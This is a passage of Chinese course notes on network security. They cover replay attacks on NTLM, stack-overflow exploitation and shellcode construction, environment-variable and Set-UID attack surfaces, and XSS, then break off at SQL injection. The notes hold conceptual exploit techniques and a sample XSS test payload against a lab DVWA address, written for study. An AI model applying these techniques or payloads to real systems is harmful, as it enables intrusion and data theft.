<p>软件截获：监视操作系统处理键盘输入的接口，将来自键盘的数据记录下来</p>
<h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h3><p>英文：Phishinig</p>
<p>攻击者利用欺骗性的电子邮件和伪造的Web站点，骗取用户输入口令以及其他身份敏感信息。</p>
<h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p>在信息系统中，通信的双方在使用口令进行身份验证时，为了防止嗅探攻击，通常不直接发送明文口令进行认证，而是利用口令，按照一定的认证协议和加密算法进行认证。</p>
<p>定义：攻击者记录下当前的通讯流量，以后在适当的时候重发给通讯的某一方，达到欺骗的目的。</p>
<ul>
<li>简单重放</li>
<li>反向重放</li>
</ul>
<p>介绍：« 挑战 &#x2F; 响应 »方式 （CR方式）</p>
<p>以 Windows 系统的 NTLM 认证过程为例：</p>
<ol>
<li>用户在客户机上提供用户名和口令，系统计算口令的 NTLM 散列值，然后把口令丢掉。</li>
<li>客户机以明文方式把用户名发送给服务器。</li>
<li>服务器产生一个128位随机数（称之为<strong>挑战</strong>，Challenge），并发送给客户机。</li>
<li>客户机用 NTLM 散列作为密钥，加密随机数，并把结果送回给服务器，产生<strong>应答</strong>（Response）。</li>
<li>服务器通过用户名从 SAM 数据库得到用户口令的 NTLM 散列，用这个值作为密钥加密 Challenge，并将加密后的结果和 Response 作比较，如果相等则认证成功；否则则认证失败。</li>
</ol>
<p>具体过程：</p>
<ol>
<li>主机 A 向主机 B 发出资源访问请求，B 返回给 A 一个挑战值 Challenge。</li>
<li>由于 A 没有 B 的合法帐号，因此无法计算响应值 Response，此时 A 暂时将会话挂起，等待机会。</li>
<li>在某一时刻，B 向 A 发出了资源访问请求，于是 A 将前面获得的 Challenge 作为自己的挑战值发送给 B。</li>
<li>B计算出 Response，返回给 A。</li>
<li>现在，A 拥有了正确的 Response，它可以继续进行在第一步中暂时挂起的会话。</li>
</ol>
<h2 id="口令攻击的防范方法"><a href="#口令攻击的防范方法" class="headerlink" title="口令攻击的防范方法"></a>口令攻击的防范方法</h2><p>选择安全密码：</p>
<ul>
<li>设置足够长度的口令</li>
<li>口令中混合使用大小写字母、数字、特殊符号</li>
</ul>
<p>防止口令猜测攻击：</p>
<ul>
<li>硬盘分区采用 NTFS 格式</li>
<li>正确设置和管理账户</li>
<li>关闭不需要的服务</li>
<li>关闭不用的端口</li>
</ul>
<p>设置安全策略</p>
<h1 id="软件漏洞"><a href="#软件漏洞" class="headerlink" title="软件漏洞*"></a>软件漏洞*</h1><h2 id="漏洞的定义"><a href="#漏洞的定义" class="headerlink" title="漏洞的定义"></a>漏洞的定义</h2><p>指信息系统硬件、软件、操作系统、网络协议、数据库等在设计上、实现上出现的可以被攻击者利用的错误、缺陷和疏漏。</p>
<p>通俗一点说，漏洞就是可以被攻击利用的系统弱点。</p>
<h2 id="典型漏洞类型"><a href="#典型漏洞类型" class="headerlink" title="典型漏洞类型"></a>典型漏洞类型</h2><p>栈溢出（Stack Overflow）</p>
<p>堆溢出（Heap Overflow）</p>
<p>格式化串（Format String）</p>
<p>整型溢出（Integer Overflow）</p>
<p>释放再使用（Use after Free）</p>
<h2 id="栈溢出漏洞利用原理"><a href="#栈溢出漏洞利用原理" class="headerlink" title="栈溢出漏洞利用原理*"></a>栈溢出漏洞利用原理*</h2><p><em>内存分布、<strong>漏洞利用内存变化、压栈 &#x2F; 出栈、栈溢出原理</strong></em></p>
<h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理*"></a>栈溢出原理*</h3><p>当程序运行时，计算机会在内存区域中开辟一段连续的内存块，包括<strong>代码段</strong>、<strong>数据段</strong>和<strong>堆栈段</strong>三部分。</p>
<img src="D:\PicGo\typoraimage\image-20231221194243521.png" alt="image-20231221194243521" style="zoom: 50%;" />



<p>程序在内存中的存放形式</p>
<img src="D:\PicGo\typoraimage\image-20231221194421626.png" alt="image-20231221194421626" style="zoom:50%;" />



<ul>
<li><p>代码段(.text)，也称文本段（Text Segment）</p>
<ul>
<li>存放着程序的机器码和只读数据，可执行指令就是从这里取得的，这个段在内存中一般被标记为只读，任何对该区的写操作都会导致段错误（Segmentation Fault）。</li>
</ul>
</li>
<li><p>数据段（在编译时分配），包括：</p>
<ul>
<li>已初始化的数据段（.data）<ul>
<li>存放保存全局的和静态的已初始化变量</li>
</ul>
</li>
<li>未初始化的数据段（.bss）<ul>
<li>保存全局的和静态的未初始化变量</li>
</ul>
</li>
</ul>
</li>
<li><p>堆栈段：堆 &amp;&amp; 栈</p>
<ul>
<li>堆（Heap）：位于 BSS 内存段的上边，用来存储程序运行时分配的变量。<ul>
<li>堆的大小并不固定，可动态扩张或缩减。其分配由 malloc()、new() 等这类实时内存分配函数来实现。当进程调用malloc 等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用 free 等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</li>
<li>堆的内存释放由应用程序去控制，通常一个 new() 就要对应一个 delete() ，如果程序员没有释放掉，那么在程序结束后操作系统会自动回收。</li>
</ul>
</li>
<li>栈（Stack）：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。<ul>
<li>在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除。</li>
<li>栈的特性：先入后出（FILO）</li>
<li>基本操作：<ul>
<li>Push：向栈中添加数据，称为压栈，数据将放置在栈顶 </li>
<li>Pop：POP操作相反，在栈顶部移去一个元素，并将栈的大小减一，称为弹栈。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231221200439358.png" alt="image-20231221200439358" style="zoom: 67%;" />

<ul>
<li><p>随着函数调用层数的增加，函数栈帧是一块块地向内存低地址方向延伸的。</p>
</li>
<li><p>随着进程中函数调用层数的减少，即各函数调用的返回，栈帧会一块块地被遗弃而向内存的高址方向回缩。</p>
</li>
<li><p>各函数的栈帧大小随着函数的性质的不同而不等，由函数的局部变量的数目决定。</p>
</li>
<li><p>在溢出中，我们主要关注数据区和堆栈区。</p>
</li>
</ul>
<p>在使用栈时，引用栈帧需要借助两个寄存器：</p>
<ul>
<li>SP（ESP），即<strong>栈顶指针</strong><ul>
<li>随着数据入栈出栈而发生变化。</li>
</ul>
</li>
<li>BP（EBP），即<strong>基地址指针</strong><ul>
<li>它用于标识栈中一个相对稳定的位置，通过 BP，再加上偏移地址，可以方便地引用函数参数以及局部变量。</li>
</ul>
</li>
</ul>
<p>函数被调用的时候，栈中的压入情况如下：</p>
<img src="D:\PicGo\typoraimage\image-20231221203743577.png" alt="image-20231221203743577" style="zoom: 67%;" />

<p>在局部变量的下面，是前一个调用函数的 EBP，接下来就是返回地址。</p>
<p>如果局部变量发生溢出，很有可能会覆盖掉 EBP 甚至 RET（返回地址），这就是缓冲区溢出攻击的« 奥秘 »所在。</p>
<p>栈溢出原理：如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大型程序还有可能会导致系统崩溃。</p>
<p>程序中发生函数调用时，计算机做如下操作：</p>
<ol>
<li><p>首先把指令寄存器 EIP（它指向当前 CPU 将要运行的下一条指令的地址）中的内容压入栈，作为程序的返回地址（下文中用 RET 表示）</p>
</li>
<li><p>之后放入栈的是基址寄存器 EBP，它指向当前函数栈帧（stack frame）的底部</p>
</li>
<li><p>然后把 EBP 修改为当前的栈指针 ESP 的值，作为新的基地址，最后为本地变量的动态存储分配留出一定空间，并把 ESP 减去适当的数值</p>
</li>
</ol>
<h2 id="溢出漏洞利用原理"><a href="#溢出漏洞利用原理" class="headerlink" title="溢出漏洞利用原理*"></a>溢出漏洞利用原理*</h2><p><em>基本流程，<strong>关键技术</strong></em></p>
<h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol>
<li>注入恶意数据</li>
<li>溢出缓冲区</li>
<li>控制流重定向</li>
<li>执行有效载荷</li>
</ol>
<h3 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术*"></a>关键技术*</h3><h4 id="溢出点定位"><a href="#溢出点定位" class="headerlink" title="溢出点定位"></a>溢出点定位</h4><p>如何确定溢出点位置？</p>
<ul>
<li>探测法<ul>
<li>构造数据，根据出错的情况来判断。</li>
</ul>
</li>
<li>反汇编分析</li>
</ul>
<h4 id="覆盖执行控制地址"><a href="#覆盖执行控制地址" class="headerlink" title="覆盖执行控制地址"></a>覆盖执行控制地址</h4><p>覆盖执行控制地址可包括：</p>
<ul>
<li>覆盖返回地址</li>
<li>覆盖函数指针变量</li>
<li>覆盖异常处理结构</li>
</ul>
<h4 id="覆盖异常处理结构"><a href="#覆盖异常处理结构" class="headerlink" title="覆盖异常处理结构"></a>覆盖异常处理结构</h4><p>异常处理是一种对程序异常的处理机制，它把错误处理代码与正常情况下所执行的代码分开。</p>
<p>当程序发生异常时，系统中断当前线程，将控制权交给异常处理程序。</p>
<p>Windows 的异常处理机制称为结构化异常处理（Structured Exception Handling）。</p>
<h4 id="跳转地址的确定"><a href="#跳转地址的确定" class="headerlink" title="跳转地址的确定"></a>跳转地址的确定</h4><p>跳转指令的选取</p>
<ul>
<li>jmp esp、call ebx、call ecx等</li>
</ul>
<p>跳转指令的搜索范围</p>
<ul>
<li>用户空间的任意地址、系统dll、进程代码段、PEB、TEB</li>
<li>跳转指令地址的选择规律</li>
</ul>
<h4 id="Shellcode-的定位和跳转"><a href="#Shellcode-的定位和跳转" class="headerlink" title="Shellcode 的定位和跳转"></a>Shellcode 的定位和跳转</h4><img src="D:\PicGo\typoraimage\image-20231223183720287.png" alt="image-20231223183720287" style="zoom: 67%;" />

<ul>
<li>NOP Sled：类 NOP 指令填充，可以是 NOP，也可以是inc eax 等无副作用指令。</li>
<li>Decoder：解码部分，对 Real_Shellcode 解码。</li>
<li>Real_Shellcode：真正有意义的 shellcode 部分，但是经过了编码处理。</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231223185040719.png" alt="image-20231223185040719" style="zoom:50%;" />











<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p><em>定义，作用，如何编写步骤，需要注意事项，通用 Shellcode 编写方法</em></p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>ShellCode就是一段能够完成一定功能（比如打开一个命令窗口）、可直接由计算机执行的机器代码，通常以十六进制的形式存在。</p>
<p>e.g：</p>
<img src="D:\PicGo\typoraimage\image-20231223185335655.png" alt="image-20231223185335655" style="zoom:50%;" />





<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li><p>可以是处于恶作剧弹出对话框</p>
</li>
<li><p>打开 dos 窗口（执行任意程序）</p>
</li>
<li><p>添加系统管理用户</p>
</li>
<li><p>打开可以远程连接的端口</p>
</li>
<li><p><strong>发起反向连接</strong></p>
</li>
<li><p><strong>上传（下载）木马病毒并运行</strong></p>
</li>
<li><p>可能是攻击性的，删除重要文件、窃取数据</p>
</li>
<li><p>破坏，格式化磁盘</p>
</li>
<li><p>……</p>
</li>
</ul>
<h3 id="如何编写"><a href="#如何编写" class="headerlink" title="如何编写"></a>如何编写</h3><p>例如编写一个打开 windows 对话框的 Shellcode</p>
<ol>
<li>编写打开 windows 对话框的 C 程序</li>
<li>Windows 函数调用原理</li>
<li>使用汇编生成 Shellcode</li>
</ol>
<p>编写打开 windows 对话框的 C 程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>,</span><br><span class="line">              <span class="string">&quot;网络攻防ShellCode测试！&quot;</span>,</span><br><span class="line">              <span class="string">&quot;网络安全&quot;</span>,</span><br><span class="line">              MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Windows 函数调用原理</p>
<ul>
<li>加载（LOAD）函数所在的动态链接库</li>
<li>使用堆栈进行参数传递</li>
<li>调用（CALL）函数地址</li>
</ul>
<p>e.g：在 Windows 下执行 Func（argv1，argv2，argv3）</p>
<ul>
<li>将argv3，argv2，argv1 压入堆栈<ul>
<li>在 32 位的汇编中，参数通常是以 stdcall 调用约定传递的，所以参数的顺序是从右往左依次压栈</li>
</ul>
</li>
<li>调用函数地址（Push EIP，JUMP FUNC）</li>
</ul>
<p>使用汇编生成 ShellCode</p>
<p>继续前面的例子：如何把 MessageBox 写成汇编？</p>
<p>思路：</p>
<ul>
<li>将« 参数 »压栈</li>
<li>将« 参数 »地址压栈</li>
<li>Call MessageBox 函数地址</li>
</ul>
<p>注意：</p>
<ul>
<li>Push 是 4 个字节对齐的（32位），因此必须每次压栈 4 个字节或者 1 个字节 1 个字节地赋值</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231224125413912.png" alt="image-20231224125413912" style="zoom: 50%;" />



<p>写成汇编之后，再把机器码抄下来，就是 ShellCode。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>正常退出</p>
<ul>
<li>process：用 ExitProcess()</li>
<li>SEH：强制产生一个异常调用（可能会使 exploit 代码不停运行）</li>
<li>thread：用 ExitThread()</li>
</ul>
<p>处理 null 字节</p>
<ul>
<li><p>可替代指令 &amp; 指令编码</p>
<ul>
<li>用 add &amp; sub 来重新产生原来的值</li>
<li>sniper：precision - null - byte - boming</li>
<li>将原始值一字节一字节写入</li>
<li>xor</li>
<li>寄存器：32位 -&gt; 16位 -&gt; 8位</li>
<li>用可替代指令</li>
<li>从 null 字节到 空格&amp;null 字节</li>
</ul>
</li>
<li><p>编码器：payload 编码</p>
</li>
</ul>
<p>加载 dll</p>
<h3 id="通用ShellCode编写方法"><a href="#通用ShellCode编写方法" class="headerlink" title="通用ShellCode编写方法"></a>通用ShellCode编写方法</h3><p>将每个版本的 Windows 操作系统所对应的函数地址列出来，然后针对不同版本的操作系统使用不同的地址。</p>
<p>动态定位函数地址</p>
<ul>
<li>即使用 GetProcAddress 和 LoadLibrary 函数动态获取其他函数的地址</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231224143956520.png" alt="image-20231224143956520" style="zoom:50%;" />



<p>如何获取 GetProcAddress 和 LoadLibrary 的地址：</p>
<ul>
<li><p>暴力搜索</p>
</li>
<li><p>使用 PEB 获取 GetProcAddress 地址</p>
</li>
<li><p>SHE 获得 kernel 基址</p>
</li>
<li><p>HASH 法查找所有函数地址</p>
</li>
</ul>
<h2 id="环境变量攻击"><a href="#环境变量攻击" class="headerlink" title="环境变量攻击"></a>环境变量攻击</h2><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>定义：</p>
<ul>
<li>一组动态的定义值</li>
<li>操作系统运行环境的一部分</li>
<li>影响正在运行进程的行为方式（加载哪些外部 DLL）</li>
<li>在 Unix 中提出，也被微软操作系统采用</li>
<li>示例：PATH 变量<ul>
<li>当执行一个程序时，如果没有提供完整的路径，shell 进程将使用环境变量来找到程序的位置。</li>
</ul>
</li>
</ul>
<p>进程可以通过以下两种方式来获取环境变量：</p>
<ul>
<li>如果使用 fork() 创建了一个新进程，则子进程将继承其父进程的环境变量。</li>
<li>如果进程使用 execve() 启动了一个新程序，在此场景中内存空间被覆盖，所有旧环境变量将丢失。可以用一种特殊的方式调用执行 lost.Execve()，以将环境变量从一个进程传递给另一个进程。</li>
</ul>
<p>内存位置：</p>
<ul>
<li><code>envp</code> 和 <code>environ</code> 最初指的是一个地方<ul>
<li><code>envp</code> 和 <code>environ</code> 都是指向当前进程环境变量的指针数组的指针</li>
</ul>
</li>
<li><code>envp</code> 只能在主函数中可访问，而 <code>environ</code> 是一个全局变量<ul>
<li>在C语言中，<code>envp</code> 是传递给 <code>main</code> 函数的第三个参数，它是一个指向指针数组的指针，其中每个指针指向一个以« 变量 &#x3D; 值 »形式表示的环境变量字符串。</li>
<li><code>environ</code> 是一个全局变量，通常由操作系统或标准库设置，它也是一个指向指针数组的指针，其中每个指针同样指向一个以« 变量 &#x3D; 值 »形式表示的环境变量字符串。在一些系统上，<code>environ</code> 被用来访问进程的环境变量。</li>
</ul>
</li>
<li>当对环境变量进行更改时（例如添加新变量），存储环境变量的位置可能会移动到堆中，因此 <code>environ</code> 将发生更改（<code>envp</code> 不会改变）</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231224162855718.png" alt="image-20231224162855718" style="zoom:50%;" />





<h3 id="Shell-命令变量和环境变量"><a href="#Shell-命令变量和环境变量" class="headerlink" title="Shell 命令变量和环境变量"></a>Shell 命令变量和环境变量</h3><p>人们经常认为 shell 命令变量和环境变量是相同的（其实不同）。</p>
<p>shell 命令变量：</p>
<ul>
<li>shell 使用的内部变量</li>
<li>shell 提供了内置命令，允许用户创建、分配和删除 shell 变量</li>
</ul>
<p>&#x2F;proc 文件系统</p>
<ul>
<li><p>&#x2F;proc 是 linux 中的一个虚拟文件系统。它包含每个进程的一个目录，使用进程ID作为目录的名称。</p>
</li>
<li><p>每个进程目录都有一个名为 environ 的虚拟文件，其中包含进程的环境。</p>
</li>
<li><p>当在bash shell 中调用 env 程序时，它将在子进程中运行。因此，它打印出 shell 子进程的环境变量，而不是它自己的环境变量。</p>
</li>
</ul>
<p>shell 命令变量和环境变量不同：</p>
<ul>
<li>当 shell 程序启动时，它会将环境变量复制到自己的 shell 变量中。对 shell 变量所做的更改将不会反应在环境变量上。</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231224171953715.png" alt="image-20231224171953715" style="zoom:50%;" />

<ul>
<li>此图显示了 shell 变量如何影响子进程的环境变量</li>
<li>它还显示了父进程的 shell 变量的环境变量如何成为子进程的环境变量</li>
</ul>
<h3 id="环境变量的攻击面"><a href="#环境变量的攻击面" class="headerlink" title="环境变量的攻击面"></a>环境变量的攻击面</h3><p>环境变量隐藏使用很危险。</p>
<p>由于用户可以设置环境变量，因此它们将成为 Set-UID 程序的攻击面的一部分。</p>
<img src="D:\PicGo\typoraimage\image-20231224174303429.png" alt="image-20231224174303429" style="zoom:50%;" />



<h4 id="Set-UID"><a href="#Set-UID" class="headerlink" title="Set-UID"></a>Set-UID</h4><p>概念：</p>
<ul>
<li><p>允许用户以程序所有者的权限允许程序。</p>
</li>
<li><p>允许用户以临时提升的权限允许程序。</p>
</li>
<li><p>每个进程都有两个用户ID</p>
<ul>
<li>Real UID（RUID）：确定进程的真正所有者。</li>
<li>Effective UID（EUID）：表示进程的权限<ul>
<li>访问控制是基于 EUID 的</li>
</ul>
</li>
<li>当执行正常程序时，RUID &#x3D; EUID，他们都等于运行程序的用户的 ID</li>
<li>当执行 Set-UID 时，RUID ≠ EUID，RUID 还是用户 ID，但是 EUID 是程序 owner 的 ID<ul>
<li>如果程序归 root 所有，则程序以 root 权限允许</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="通过动态链接器攻击"><a href="#通过动态链接器攻击" class="headerlink" title="通过动态链接器攻击"></a>通过动态链接器攻击</h4><p>链接可以找到在程序中运行的外部库代码；</p>
<p>链接可以在运行或编译时完成</p>
<ul>
<li><p>静态链接</p>
<ul>
<li>编译器将程序所需的库的代码和数据复制到最终的可执行文件中</li>
<li>优点：可执行文件包含了所有它需要的代码和数据，使得它可以独立运行，而不需要外部的库文件支持</li>
<li>缺点：如果多个程序使用了同一个库，那么每个程序都会包含一份该库的副本，导致可执行文件变得更大，并且浪费了存储空间</li>
</ul>
</li>
<li><p>动态链接</p>
<ul>
<li>使用环境变量，它将成为攻击面的一部分</li>
<li>程序在运行时才会加载所需的库，而不是在编译时将库的代码和数据复制到可执行文件中</li>
<li>系统提供了共享库（也称为动态链接库），程序在运行时链接到这些共享库，而不是将库的代码和数据复制到可执行文件中</li>
<li>优点：节省了存储空间，因为多个程序可以共享同一个库的副本。此外，如果共享库更新了，所有依赖它的程序都能受益于更新，而不需要重新编译</li>
<li>缺点：动态链接需要在运行时动态加载库，这可能会稍微增加启动时间，并且如果系统中缺少所需的共享库，程序可能无法正常运行</li>
</ul>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231225125331423.png" alt="image-20231225125331423" style="zoom:50%;" />



<p>动态链接节省内存。这意味着程序在编译期间未决定部分代码。</p>
<p>如果用户可以影响丢失的代码，它们可能会损害程序的完整性。</p>
<h4 id="通过外部程序攻击"><a href="#通过外部程序攻击" class="headerlink" title="通过外部程序攻击"></a>通过外部程序攻击</h4><p>应用程序可以调用外部程序。</p>
<p>应用程序本身可能不使用环境变量，但被调用的外部程序可能会使用。</p>
<h4 id="通过应用程序代码的攻击"><a href="#通过应用程序代码的攻击" class="headerlink" title="通过应用程序代码的攻击"></a>通过应用程序代码的攻击</h4><p>程序可以直接使用环境变量。如果这些是特权程序，它可能会导致不可信任的输入。</p>
<h4 id="Set-UID-VS-服务方法"><a href="#Set-UID-VS-服务方法" class="headerlink" title="Set-UID VS 服务方法"></a>Set-UID VS 服务方法</h4><img src="D:\PicGo\typoraimage\image-20231225141349058.png" alt="image-20231225141349058" style="zoom:50%;" />

<p>大多数操作系统遵循两种方法，允许正常用户执行特权操作</p>
<ul>
<li><p>Set-UID方法：普通用户必须运行一个特殊的程序（设置了 Set-UID 的可执行程序）才能临时获得 root 权限（通常是 root 权限）</p>
</li>
<li><p>服务方法：普通用户必须请求特权服务才能为他们执行操作</p>
</li>
</ul>
<p>Set-UID具有更广泛的攻击面，这是由环境变量引起的</p>
<ul>
<li><p>在 Set-UID 方法中不能信任环境变量</p>
</li>
<li><p>环境变量在服务方法中可以被信任</p>
</li>
</ul>
<p>尽管其他攻击面仍然适用于服务方法，但它被认为比 Set-UID 方法更安全</p>
<p>因此，安卓操作系统完全删除了 Set-UID 和 Set-GID 机制</p>
<h1 id="Web-应用攻击"><a href="#Web-应用攻击" class="headerlink" title="Web 应用攻击*"></a>Web 应用攻击*</h1><h2 id="Web-应用结构"><a href="#Web-应用结构" class="headerlink" title="Web 应用结构"></a>Web 应用结构</h2><p><em>架构、基本内容</em></p>
<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>Web 服务器（Web 网页、数据库）</p>
<p>Web 客户端（浏览器）</p>
<p>HTTP 协议</p>
<img src="D:\PicGo\typoraimage\image-20231225142615551.png" alt="image-20231225142615551" style="zoom: 67%;" />

<p>Web 网页</p>
<p>Web 网页位于 Web 服务器上，用于展示信息，一般采用 HTML 语言（Hypertext Markup Language）编写。</p>
<ul>
<li>静态网页<ul>
<li>静态网页是指内容固定，不会根据 Web 客户端请求的不同而改变的 Web 网页</li>
</ul>
</li>
<li>动态网页<ul>
<li>动态网页是相对应静态网页而言的，是指内容会根据时间、环境或者用户输入的不同而改变的 Web 网页</li>
</ul>
</li>
</ul>
<h3 id="Web-应用攻击类型"><a href="#Web-应用攻击类型" class="headerlink" title="Web 应用攻击类型"></a>Web 应用攻击类型</h3><p>Web 客户端攻击（攻击用户 ）</p>
<ul>
<li>跨站脚本攻击（Cross-Site Scripting，简称 XSS 攻击）、网络钓鱼和网页挂马</li>
</ul>
<p>Web 服务器攻击</p>
<ul>
<li>网页篡改、代码注入攻击、文件操作控制攻击等</li>
<li>HTTP 头注入攻击、HTTP 会话攻击</li>
</ul>
<h2 id="XSS-攻击"><a href="#XSS-攻击" class="headerlink" title="XSS 攻击*"></a>XSS 攻击*</h2><p><em>定义、同源策略、<strong>危害、代码漏洞分析及利用方法、类型、防范措施</strong></em></p>
<p>跨站脚本攻击出现在上世纪90年代中，由于跨站脚本攻击的缩写和层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防止混淆，故缩写成 XSS 攻击。</p>
<p>XSS 攻击是由于 Web 应用程序对用户输入过滤不足而产生的，使得攻击者输入的特定数据变成了 JavaScript 脚本或 HTML 代码。</p>
<p>同源策略</p>
<p>它的含义是指，A网页设置的 Cookie，B 网页不能打开，除非这两个网页 « 同源 »。所谓 « 同源 » 指的是 « 三个相同 »。</p>
<ul>
<li>协议相同、域名相同、端口相同</li>
</ul>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>(1) 网络钓鱼，包括盗取各类用户账号 </p>
<p>(2) 窃取用户 cookies 资料，从而获取用户隐私信息，或利用好用户身份进行一部对网站执行操作</p>
<p>(3) 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、发送电子邮件等</p>
<p>(4) 强制弹出广告页面、刷流量等； </p>
<p>(5) 网页挂马 </p>
<p>(6) 进行恶意操作，例如任意篡改页面信息、删除文章等；</p>
<p>(7) 进行大量的客户端攻击，如 DDoS 攻击； </p>
<p>(8) 提取客户端信息，例如用户的浏览历史、真实 IP、开放端口等； </p>
<p>(9) 控制受害者机器向其它网站发起攻击； </p>
<p>(10) 结合其他漏洞，如 CSRF 漏洞，实施进一步作恶； </p>
<p>(11) 提升用户权限，包括进一步渗透网站； </p>
<p>(12) 传播跨站脚本蠕虫；</p>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>反射型 XSS（Reflected Cross-site Scripting）</p>
<p>存储型 XSS（Persistent Cross-site Scripting）</p>
<p>DOM 型 XSS（）</p>
<p>反射型 XSS</p>
<p>非持久性、参数型跨站脚本</p>
<p>恶意脚本附加到 URL 地址参数中</p>
<p><code>http://192.168.220.128/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt; alert(/xss/)&lt;/script&gt;</code></p>
<p>工作流程：<img src="D:\PicGo\typoraimage\image-20231225152429831.png" alt="image-20231225152429831" style="zoom: 67%;" /></p>
<p>存储型 XSS</p>
<p>持久型</p>
<p>一般攻击存在留言、评论、博客日志等中</p>
<p>恶意脚本被存储在服务端的数据库中</p>
<p>工作流程：<img src="D:\PicGo\typoraimage\image-20231225152649710.png" alt="image-20231225152649710" style="zoom:67%;" /></p>
<p>DOM 型 XSS</p>
<p>DOM XSS是基于在 js 上的</p>
<p>不需要与服务端进行交互</p>
<p>网站有一个HTML页面采用不安全的方式：</p>
<ul>
<li><p>document.location</p>
</li>
<li><p>document.URL</p>
</li>
<li><p>document.URLUnencoded</p>
</li>
<li><p>document.referrer</p>
</li>
<li><p>window.location</p>
</li>
<li><p>…….</p>
</li>
</ul>
<p>工作流程：<img src="D:\PicGo\typoraimage\image-20231225153039092.png" alt="image-20231225153039092" style="zoom:67%;" /></p>
<h3 id="XSS-攻击利用方式"><a href="#XSS-攻击利用方式" class="headerlink" title="XSS 攻击利用方式"></a>XSS 攻击利用方式</h3><p>Cookie 窃取</p>
<p>会话劫持</p>
<ul>
<li>攻击者通过 XSS 攻击，冒用合法者的会话 ID 进行网络访问的一种攻击方式</li>
<li>会话 ID：由 Web 客户端提供给服务器以表示同一个会话，一般采用 Cookie 方式或 URL 方式传递。会话数据则一般保存在 Web 服务器，用于 Web 应用程序之间信息传递</li>
</ul>
<p>网络钓鱼</p>
<ul>
<li>攻击者可以执行 JavaScript 代码动态生成网页内容或直接注入 HTML 代码，从而产生网络钓鱼攻击</li>
<li>和传统的网络钓鱼攻击相比而言，通过 XSS 攻击实施网络钓鱼具有更强的隐蔽性</li>
</ul>
<p>信息刺探</p>
<ul>
<li>利用 XSS 攻击，可以在客户端执行一段 JavaScript 代码，因此：攻击者可以通过这段代码实现多种信息的刺探<ul>
<li>访问历史信息、端口信息、剪贴板内容、客户端 IP 地址、键盘信息等。</li>
</ul>
</li>
</ul>
<p>网页挂马</p>
<ul>
<li>将 Web 网页技术和木马技术结合起来就是网页挂马。</li>
<li>攻击者将恶意脚本隐藏在 Web 网页中，当用户浏览该网页时，这些隐藏的恶意脚本将在用户不知情的情况下执行，下载并启动木马程序。</li>
</ul>
<p>XSS 蠕虫</p>
<ul>
<li><p>XSS 蠕虫是指利用 XSS 攻击进行传播的一类恶意代码，一般利用存储型 XSS 攻击。</p>
</li>
<li><p>XSS 蠕虫的基本原理就是将一段 JavaScript 代码保存在服务器上，其他用户浏览相关信息时，会执行 JavaScript 代码，从而引发攻击。</p>
</li>
</ul>
<h3 id="XSS-防范措施"><a href="#XSS-防范措施" class="headerlink" title="XSS 防范措施"></a>XSS 防范措施</h3><p>HttpOnly 属性</p>
<ul>
<li><p>HttpOnly 是另一个应用给 cookie 的标志，而且所有现代浏览器都支持它。</p>
</li>
<li><p>HttpOnly 标志的用途是指示浏览器禁止任何脚本访问 cookie 内容，这样就可以降低通过 JavaScript 发起的 XSS 攻击偷取 cookie 的风险。</p>
</li>
</ul>
<p>安全编码</p>
<ul>
<li>PHP 语言中针对 XSS 攻击的安全编码函数有 htmlentities 和 htmlspecialchars 等，这些函数对特殊字符的安全编码方式如下：小于号（&lt;）转换成 &amp;lt、大于号（&gt;）转换成 &amp;gt、与符号（&amp;）转换成 &amp;amp、双引号（”）转换成 &amp;quot、单引号（’）转换成 &amp;#39。</li>
</ul>
<h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><p><em>定义、类型、注入步骤、提权方法、暴库定义、防范措施</em></p>
<p>就是向网站提交精心构造的 SQL 查询语句，导致网站将关键数据信息返回。</p>
<p>结构化查询语言——SQL</p>
<ul>
<li>一种用来和数据库交互的查询语言</li>
</ul>
<p>SQL 存储过程</p>
<ul>
